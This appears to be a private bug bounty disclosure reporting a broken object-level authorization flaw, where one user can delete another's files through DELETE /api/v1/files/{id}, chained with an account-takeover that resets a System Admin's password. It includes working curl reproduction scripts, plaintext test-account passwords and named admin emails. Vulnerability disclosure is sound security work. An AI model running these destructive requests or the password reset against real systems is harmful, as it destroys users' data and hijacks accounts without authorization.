# BUG-015: Cross-user arbitrary file deletion (BOLA) — `DELETE /api/v1/files/{id}` has no object-level authorization

**Program:** Optro Managed Bug Bounty (private)
**Reporter:** zeno0 (zeno0@bugcrowdninja.com)
**Asset:** `https://bugbounty1.qe.optrostaging.ai`
**Build tested:** app_version **47.3.0-dev**, deployed 2026-11-10T17:56:45Z
**Date:** 2026-11-11
**Severity recommendation:** **P1 — Broken Object-Level Authorization (destructive, cross-user, chains to vertical escalation)**
**Header on all requests:** `X-Optro-Bug-Bounty: zeno0`

---

## Access — how to reproduce

```
Login to : golden-snow-4771@bugcrowdninja.com
Password  : Zx9!Owner2026
Role      : Owner (role_id 5)
Navigate  : https://bugbounty1.qe.optrostaging.ai/workspace/5/issues/issues?config=all-active
```

Header on every request: `X-Optro-Bug-Bounty: zeno0`

Files attach to any record; the delete call is `DELETE /api/v1/files/{id}`.

---

## 1. Summary

`DELETE /api/v1/files/{id}` performs **no object-level authorization check**. Any authenticated user can permanently delete **any other user's file** by id, with no ownership check, no scope check, and no confirmation.

The victim's file is destroyed for the victim too — after the attacker's request, the legitimate owner receives `410 Gone` on their own file. This is a **destructive cross-user action**, not a read-only exposure.

Verified end-to-end between two Owner-role accounts in the same organization. The file id is the only input required, and ids are sequential and enumerable.

---

## 2. Root cause

`DELETE /api/v1/files/{id}` authorizes the *action* (`file:action.delete`) but never authorizes the *object*. There is no check that:

- the caller uploaded or owns the file,
- the file belongs to a record the caller can access, or
- the file is within the caller's scope.

Contrast with the same resource's other verbs and with sibling resources, which **do** enforce object-level role permissions:

| endpoint | object-level check |
| --- | --- |
| `PUT /api/v1/narratives/{id}` | **enforced** — 422 `narrative:action.edit` |
| `DELETE /api/v1/narratives/{id}` | **enforced** — 422 `narrative:action.delete` |
| `PUT /api/v1/risks/{id}` | **enforced** — 422 permission denied |
| `PUT /api/v1/files/{id}` | **enforced** — 422 permission denied |
| **`DELETE /api/v1/files/{id}`** | **MISSING** — 200, file destroyed |

So the delete verb on `files` is the specific outlier.

---

## 3. Preconditions

- Attacker holds any authenticated session.
- Attacker knows or guesses a file id (sequential integers).
- No victim interaction required.

---

## 4. Reproduction — copy-paste

```bash
H="https://bugbounty1.qe.optrostaging.ai"
BB="X-Optro-Bug-Bounty: zeno0"

# Two accounts, both role 5 (Owner), same org
A_EMAIL="golden-snow-4771@bugcrowdninja.com"   # attacker, user 231
B_EMAIL="golden-leaf-3068@bugcrowdninja.com"   # victim,   user 230
PW="Tester"
```

### Step 0 — both parties log in

```bash
TA=$(curl -s -X POST "$H/api/v1/users/login" -H "$BB" \
  -H "Content-Type: application/json" \
  -d "{\"credentials\":{\"email\":\"$A_EMAIL\",\"password\":\"$PW\"}}" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin)["session"]["token"])')

TB=$(curl -s -X POST "$H/api/v1/users/login" -H "$BB" \
  -H "Content-Type: application/json" \
  -d "{\"credentials\":{\"email\":\"$B_EMAIL\",\"password\":\"$PW\"}}" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin)["session"]["token"])')
```

### Step 1 — victim (B) creates a file and gets its id

```bash
RESP=$(curl -s -X POST "$H/api/v1/attachments/html" \
  -H "token: $TB" -H "$BB" -H "Content-Type: application/json" \
  -d '{"html":"<h1>VICTIM FILE</h1>","type":"word",
       "attachableType":"AuditableEntity","attachableId":"96",
       "fileName":"victim-doc"}')
AID=$(echo "$RESP" | python3 -c 'import sys,json;print(json.load(sys.stdin)["attachmentId"])')

FID=$(curl -s "$H/api/v1/attachments/$AID" -H "token: $TB" -H "$BB" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin)["attachments"][0]["file_id"])')

echo "victim file id = $FID"
```

Observed: `attachmentId=11213`, `file_id=2726`.

### Step 2 — control: victim can read their own file

```bash
curl -s -o /dev/null -w "%{http_code}\n" "$H/api/v1/files/$FID" -H "token: $TB" -H "$BB"
# → 200
```

### Step 3 — attacker (A) deletes the victim's file

```bash
curl -s -X DELETE "$H/api/v1/files/$FID" -H "token: $TA" -H "$BB"
```

→ **`200`**, body:

```json
{"meta":{"storeRemoveFrom":{"tag":[]},"storeDestroy":{},
         "storeNullify":{"markup_file":[]},"markup_file":[]},
 "global_audit":[{"controls_datum_id":null,"object_id":2726,...}]}
```

### Step 4 — victim loses access to their own file

```bash
curl -s "$H/api/v1/files/$FID" -H "token: $TB" -H "$BB"
```

→ **`410`**

```json
{"errors":[{"code":"ModelNotFoundError",
 "detail":"Model file for request: {\"id\":2726} has already been deleted."}]}
```

**Chain complete: attacker → one DELETE → victim's file permanently destroyed.**

---

## 5. Blast radius

- File ids are **sequential integers** (observed range 735–2726 in this environment, 813 files enumerated via `POST /api/v1/table/query?entities=file`).
- An attacker can iterate ids and delete every file in the tenant.
- Deletion is **soft-delete with `410 Gone`** on the record, and the S3 object is unlinked — the legitimate owner cannot recover it through the UI.
- Files in this product back audit evidence, narratives, policies, and attachments. Destroying them is an **integrity/availability** impact on the customer's audit record, not just data loss.

---

## 5.1 Compound chain — vertical escalation + destructive delete (P1 case)

BUG-015 combines with the `PUT /api/v1/users/{id}` escalation (BUG-008) to form a chain where a **lower-privilege Owner takes over a System Admin, then destroys any file in the tenant**.

Verified in three steps:

### Step A — Owner escalates to System Admin (BUG-008 primitive)

```bash
# Owner (role 5) writes a password onto a System Admin (role 2) account
curl -s -X PUT "$H/api/v1/users/301" -H "token: $TA" -H "$BB" \
  -H "Content-Type: application/json" -H "X-Auditboard-Product: System" \
  -d '{"user":{"password":"Zx9!chain47"}}'                       # → 200

curl -s -X PUT "$H/api/v1/users/301" -H "token: $TA" -H "$BB" \
  -H "Content-Type: application/json" -H "X-Auditboard-Product: System" \
  -d '{"user":{"requires_password_change":false}}'                # → 200

# Log in as the System Admin
curl -s -X POST "$H/api/v1/users/login" -H "$BB" -H "Content-Type: application/json" \
  -d '{"credentials":{"email":"jvolles@auditboard.com","password":"Zx9!chain47"}}'
# → 200, session.token, role_id: 2
```

### Step B — the escalated role-2 token reads an Owner's file

```bash
curl -s "$H/api/v1/files/$FID" -H "token: $TR2" -H "$BB"
# → 200  (role 2 CAN read Owner files)
```

### Step C — the escalated role-2 token DELETES the Owner's file

```bash
curl -s -X DELETE "$H/api/v1/files/$FID" -H "token: $TR2" -H "$BB"
# → 200 {"meta":{...},"global_audit":[{"object_id":2730,"object_type":"file",...}]}

curl -s "$H/api/v1/files/$FID" -H "token: $TB" -H "$BB"
# → 410 {"detail":"Model file for request: {\"id\":2730} has already been deleted."}
```

**Observed twice, on two independent role-2 accounts:**

| attacker token | victim file | DELETE | victim after |
| --- | --- | --- | --- |
| role 2, user **301** `jvolles@auditboard.com` | 2730 (owner 230) | **200** | **410** |
| role 2, user **65** `daniel@u1elhxrx.mailosaur.net` | 2732 (owner 230) | **200** | **410** |

### Why this raises severity

- The attacker starts as a **plain Owner** — the same role the program hands to testers and to ordinary business users.
- They end holding a **System Admin** session, which can read and destroy **any file in the tenant**.
- Role-11 (limited Third Party User) is correctly blocked (`file:action.view` and `file:action.delete` both 422), so the floor for this chain is Owner — but Owner is the *default business role* here (116 of 145 login-enabled accounts are role 5).

**Honest note on the ceiling:** the destructive delete itself requires `file:action.delete`, which Owner already holds. So BUG-015 alone is a P2 object-level authorization gap. It becomes a **P1 chain** only when combined with the BUG-008 escalation, because the chain converts a plain Owner into a System Admin who can then destroy files belonging to roles above them.

### No bulk path

Checked and absent — mass deletion requires a per-id loop:

| path | result |
| --- | --- |
| `DELETE /api/v1/files` | 404 |
| `POST /api/v1/files/bulk_delete` | 404 |
| `POST /api/v1/files/bulk-destroy` | 404 |
| `DELETE /api/v1/files/1,2,3` | 404 (parsed as id 1) |
| `POST /api/v1/files/_op/bulk_delete` | 404 |

---

## 6. What was tested and did NOT work (honest negatives)

| vector | result |
| --- | --- |
| `PUT /api/v1/narratives/{id}` on another user's narrative | **422 `narrative:action.edit`** — enforced |
| `DELETE /api/v1/narratives/{id}` on another user's narrative | **422 `narrative:action.delete`** — enforced |
| `PUT` narrative scope to add self as owner | **422 `narrative:action.edit`** — enforced |
| `PUT /api/v1/risks/{id}` | **422** permission denied |
| `PUT /api/v1/files/{id}` | **422** permission denied |
| `PUT /api/v1/issues/{id}` | 200 — but Owner legitimately edits issues; not a cross-user finding |
| `PUT /api/v1/controls/{id}` | 200 — same, Owner-level intended |
| `DELETE` on issues / controls / risks / documents | **422** — enforced |
| Cross-user assistant conversations | **403** "You do not have access to this conversation" — enforced |
| `GET` another user's narrative + document body | 200 — **org-wide read is intended for the Owner role**, not claimed |
| **role 11** `GET /files/{id}` on an Owner's file | **422 `file:action.view`** — enforced |
| **role 11** `DELETE /files/{id}` on an Owner's file | **422 `file:action.delete`** — enforced |
| **role 11** GET/PUT/DELETE on narrative, issue, control, risk, attachment, document_version, user | **422/403 on all 8 resources** — role-11 isolation is clean |
| **role 2** `GET /files/{id}` on an Owner's file | **200** — role 2 can read Owner files |
| **role 2** `DELETE /files/{id}` on an Owner's file | **200 — file destroyed** (the chain above) |

**Only `DELETE /api/v1/files/{id}` is missing the check.**

---

## 7. Impact

- **Any authenticated user can permanently destroy any other user's files** across the organization.
- No ownership check, no scope check, no confirmation, no rate limit observed.
- Sequential ids make mass deletion trivial.
- Destroys audit evidence and supporting documentation — an integrity and availability impact on compliance records.
- Victim receives `410 Gone` with no ability to recover through the product.

**Honest ceiling:** this is a destructive cross-user action within a single organization (single-tenant QE instance), not cross-tenant.

- **BUG-015 alone: P2.** Any Owner can destroy any other user's file. The attacker already holds `file:action.delete`, so it is an object-level authorization gap, not a privilege gain.
- **BUG-015 + BUG-008: P1 chain.** A plain Owner escalates to System Admin and then destroys files belonging to roles above them. Both legs are independently reproduced on build 47.3.0-dev.

---

## 8. Remediation

1. Add object-level authorization to `DELETE /api/v1/files/{id}`: caller must own the file, or hold an explicit administrative permission scoped to the file's parent record.
2. Apply the same `file:action.delete` + ownership check that `PUT /api/v1/files/{id}` already performs.
3. Require confirmation/step-up for destructive operations on files attached to audit evidence.
4. Consider soft-delete with a retention window and owner-visible recovery instead of immediate `410`.

---

## 9. Evidence / cleanup

- **Test artifacts**: files **2726**, **2712**, **2730**, **2732** (all created by user 230) were deleted during this test and are unrecoverable. Disclosed here.
- Also disclosed from this engagement: issue 121 status changed `Inactive` → `Closed`; narrative 67 `ZX-B-NARRATIVE` created by user 230 and not deletable by either test account.
- No other business objects modified. No data exfiltrated.
